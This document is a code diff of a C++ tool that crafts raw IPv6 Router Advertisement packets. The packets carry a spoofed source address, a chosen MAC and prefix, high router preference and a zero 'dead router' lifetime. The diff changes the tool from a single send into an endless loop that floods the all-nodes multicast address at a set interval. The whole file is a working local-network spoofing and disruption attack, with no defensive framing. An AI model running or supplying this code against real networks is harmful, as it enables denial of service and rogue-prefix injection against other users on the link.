@@ -1,11 +1,13 @@
 #include <iostream>
 #include <cstring>
+#include <cstdlib>
 #include <netinet/ip6.h>
 #include <netinet/icmp6.h>
 #include <arpa/inet.h>
 #include <sys/socket.h>
 #include <net/if.h>
-#include <unistd.h>
+#include <unistd.h>    // usleep
+#include <chrono>
 
 #define ND_RA_FLAG_RTPREF_HIGH 0x08
 
@@ -15,103 +17,134 @@ struct nd_opt_slla {
 };
 
 int main(int argc, char* argv[]) {
-    if (argc != 6) {
+    // now expect 7 args: hwaddr, src_ip, prefix, prefix_len, iface, sleep_sec
+    if (argc != 7) {
+        std::cerr << "Usage: " << argv[0]
+                  << " <slla MAC> <src IPv6> <prefix IPv6> <prefix_len>"
+                  << " <iface> <sleep_seconds>\n";
         return 1;
     }
 
+    const char* slla_mac_str = argv[1];
+    const char* src_ip_str   = argv[2];
+    const char* prefix_str   = argv[3];
+    int         prefix_len   = std::atoi(argv[4]);
+    const char* iface        = argv[5];
+    double      sleep_sec    = std::atof(argv[6]);
+    useconds_t  sleep_us     = (useconds_t)(sleep_sec * 1e6);
+
+    // build raw IPv6 socket
     int sock = socket(PF_INET6, SOCK_RAW, IPPROTO_RAW);
     if (sock < 0) {
+        perror("socket");
         return 1;
     }
-    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, argv[5], std::strlen(argv[5])) < 0) {
+    if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE,
+                   iface, std::strlen(iface)) < 0) {
+        perror("SO_BINDTODEVICE");
+        close(sock);
         return 1;
     }
 
-    struct sockaddr_in6 src_addr, dest_addr;
-    memset(&src_addr, 0, sizeof(src_addr));
-    memset(&dest_addr, 0, sizeof(dest_addr));
-
+    // source and destination addresses
+    struct sockaddr_in6 src_addr = {}, dest_addr = {};
     src_addr.sin6_family = AF_INET6;
     dest_addr.sin6_family = AF_INET6;
-    inet_pton(AF_INET6, argv[2], &src_addr.sin6_addr);  // Spoofed source address
-    inet_pton(AF_INET6, "ff02::1", &dest_addr.sin6_addr);  // All-nodes multicast address
+    inet_pton(AF_INET6, src_ip_str,   &src_addr.sin6_addr);
+    inet_pton(AF_INET6, "ff02::1",    &dest_addr.sin6_addr);
 
-    struct ip6_hdr ip_header;
-    memset(&ip_header, 0, sizeof(ip_header));
-    ip_header.ip6_ctlun.ip6_un1.ip6_un1_flow = htonl((6 << 28) | (0 << 20) | 0);  // Version 6, Traffic Class 0, Flow Label 0
-    ip_header.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(struct nd_router_advert) + sizeof(struct nd_opt_prefix_info) + sizeof(struct nd_opt_slla));  // Payload length
-    ip_header.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;  // Next Header: ICMPv6
-    ip_header.ip6_ctlun.ip6_un1.ip6_un1_hlim = 255;  // Hop Limit: 255
+    // prepare IPv6 header
+    struct ip6_hdr ip_header = {};
+    ip_header.ip6_ctlun.ip6_un1.ip6_un1_flow = htonl((6 << 28));
+    ip_header.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(
+        sizeof(struct nd_router_advert)
+      + sizeof(struct nd_opt_prefix_info)
+      + sizeof(struct nd_opt_slla)
+    );
+    ip_header.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
+    ip_header.ip6_ctlun.ip6_un1.ip6_un1_hlim = 255;
     ip_header.ip6_src = src_addr.sin6_addr;
     ip_header.ip6_dst = dest_addr.sin6_addr;
 
-    struct nd_router_advert icmp_header;
-    memset(&icmp_header, 0, sizeof(icmp_header));
-    icmp_header.nd_ra_hdr.icmp6_type = ND_ROUTER_ADVERT;
-    icmp_header.nd_ra_hdr.icmp6_code = 0;
-    icmp_header.nd_ra_router_lifetime = 0;  // Dead router
-    icmp_header.nd_ra_flags_reserved = ND_RA_FLAG_RTPREF_HIGH;
-    icmp_header.nd_ra_curhoplimit = 255;   // Set the hop limit to 255
+    // build ICMPv6 RA header
+    struct nd_router_advert ra = {};
+    ra.nd_ra_hdr.icmp6_type = ND_ROUTER_ADVERT;
+    ra.nd_ra_hdr.icmp6_code = 0;
+    ra.nd_ra_curhoplimit    = 255;
+    ra.nd_ra_flags_reserved = ND_RA_FLAG_RTPREF_HIGH;
+    ra.nd_ra_router_lifetime = 0;  // dead router
 
-    struct nd_opt_slla opt_slla;
-    opt_slla.hdr.nd_opt_type = ND_OPT_SOURCE_LINKADDR;
-    opt_slla.hdr.nd_opt_len = 1;
+    // parse source link-layer address option
+    struct nd_opt_slla slla = {};
+    slla.hdr.nd_opt_type = ND_OPT_SOURCE_LINKADDR;
+    slla.hdr.nd_opt_len  = 1;
+    sscanf(slla_mac_str,
+           "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+           &slla.hw_addr[0], &slla.hw_addr[1],
+           &slla.hw_addr[2], &slla.hw_addr[3],
+           &slla.hw_addr[4], &slla.hw_addr[5]);
 
-    sscanf(argv[1], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &opt_slla.hw_addr[0], &opt_slla.hw_addr[1], &opt_slla.hw_addr[2], &opt_slla.hw_addr[3], &opt_slla.hw_addr[4], &opt_slla.hw_addr[5]);
+    // build prefix info option
+    struct nd_opt_prefix_info pi = {};
+    pi.nd_opt_pi_type         = ND_OPT_PREFIX_INFORMATION;
+    pi.nd_opt_pi_len          = sizeof(pi) / 8;
+    pi.nd_opt_pi_prefix_len   = prefix_len;
+    pi.nd_opt_pi_flags_reserved =
+        ND_OPT_PI_FLAG_ONLINK | ND_OPT_PI_FLAG_AUTO;
+    pi.nd_opt_pi_valid_time      = htonl(86400);
+    pi.nd_opt_pi_preferred_time  = htonl(14400);
+    inet_pton(AF_INET6, prefix_str, &pi.nd_opt_pi_prefix);
 
-    struct nd_opt_prefix_info prefix_info;
-    memset(&prefix_info, 0, sizeof(prefix_info));
-    prefix_info.nd_opt_pi_type = ND_OPT_PREFIX_INFORMATION;
-    prefix_info.nd_opt_pi_len = sizeof(prefix_info) / 8;
-    prefix_info.nd_opt_pi_prefix_len  = std::atoi(argv[4]); // prefix length
-    prefix_info.nd_opt_pi_flags_reserved = ND_OPT_PI_FLAG_ONLINK | ND_OPT_PI_FLAG_AUTO;
-    prefix_info.nd_opt_pi_valid_time = htonl(86400); // valid lifetime (86400 seconds)
-    prefix_info.nd_opt_pi_preferred_time = htonl(14400); // preferred lifetime (14400 seconds)
-    inet_pton(AF_INET6, argv[3], &prefix_info.nd_opt_pi_prefix.s6_addr);
-
+    // pseudo-header for checksum
     struct {
-        struct in6_addr src;
-        struct in6_addr dst;
-        uint32_t len;
-        uint8_t zeros[3];
-        uint8_t next_hdr;
-    } pseudo_header;
+        struct in6_addr src, dst;
+        uint32_t        plen;
+        uint8_t        zeros[3];
+        uint8_t        nxt;
+    } pseudo = {};
+    pseudo.src   = src_addr.sin6_addr;
+    pseudo.dst   = dest_addr.sin6_addr;
+    pseudo.plen  = htonl(sizeof(ra) + sizeof(pi) + sizeof(slla));
+    pseudo.nxt   = IPPROTO_ICMPV6;
 
-    memset(&pseudo_header, 0, sizeof(pseudo_header));
-    pseudo_header.src = src_addr.sin6_addr;
-    pseudo_header.dst = dest_addr.sin6_addr;
-    pseudo_header.len = htonl(sizeof(icmp_header) + sizeof(prefix_info) + sizeof(opt_slla));
-    pseudo_header.next_hdr = IPPROTO_ICMPV6;
-
-    char icmp_buf[sizeof(icmp_header) + sizeof(prefix_info) + sizeof(opt_slla)];
-    memcpy(icmp_buf, &icmp_header, sizeof(icmp_header));
-    memcpy(icmp_buf + sizeof(icmp_header), &prefix_info, sizeof(prefix_info));
-    memcpy(icmp_buf + sizeof(icmp_header) + sizeof(prefix_info), &opt_slla, sizeof(opt_slla));
+    // assemble ICMPv6 payload & compute checksum
+    size_t icmp_len = sizeof(ra) + sizeof(pi) + sizeof(slla);
+    uint8_t *icmp_buf = (uint8_t*)malloc(icmp_len);
+    memcpy(icmp_buf,      &ra,  sizeof(ra));
+    memcpy(icmp_buf+sizeof(ra), &pi,  sizeof(pi));
+    memcpy(icmp_buf+sizeof(ra)+sizeof(pi), &slla, sizeof(slla));
 
     uint32_t sum = 0;
-    uint16_t* ptr = (uint16_t*)&pseudo_header;
-    for (int i = 0; i < sizeof(pseudo_header) / 2; i++) {
-        sum += ntohs(ptr[i]);
-    }
-    ptr = (uint16_t*)icmp_buf;
-    for (int i = 0; i < (sizeof(icmp_buf) + 1) / 2; i++) {
-        sum += ntohs(ptr[i]);
-    }
-    while (sum >> 16) {
-        sum = (sum & 0xffff) + (sum >> 16);
-    }
-    icmp_header.nd_ra_hdr.icmp6_cksum = htons(~sum);
+    auto add16 = [&](const uint16_t* ptr, size_t count) {
+        for (size_t i = 0; i < count; i++) {
+            sum += ntohs(ptr[i]);
+        }
+    };
+    add16((uint16_t*)&pseudo, sizeof(pseudo)/2);
+    add16((uint16_t*)icmp_buf, (icmp_len+1)/2);
+    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
+    ((struct nd_router_advert*)icmp_buf)->nd_ra_hdr.icmp6_cksum =
+        htons(~sum);
 
-    char buf[sizeof(ip_header) + sizeof(icmp_header) + sizeof(prefix_info) + sizeof(opt_slla)];
-    memcpy(buf, &ip_header, sizeof(ip_header));
-    memcpy(buf + sizeof(ip_header), &icmp_header, sizeof(icmp_header));
-    memcpy(buf + sizeof(ip_header) + sizeof(icmp_header), &prefix_info, sizeof(prefix_info));
-    memcpy(buf + sizeof(ip_header) + sizeof(icmp_header) + sizeof(prefix_info), &opt_slla, sizeof(opt_slla));
+    // build full packet
+    size_t packet_len = sizeof(ip_header) + icmp_len;
+    uint8_t *packet = (uint8_t*)malloc(packet_len);
+    memcpy(packet,           &ip_header, sizeof(ip_header));
+    memcpy(packet+sizeof(ip_header), icmp_buf, icmp_len);
 
-    // Send the packet
-    if (sendto(sock, buf, sizeof(buf), 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
-        return 1;
+    free(icmp_buf);
+
+    // endless loop
+    while (1) {
+        if (sendto(sock, packet, packet_len, 0,
+                   (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
+            perror("sendto");
+        }
+        usleep(sleep_us);
     }
 
+    // unreachable, but clean up
+    free(packet);
+    close(sock);
     return 0;
 }
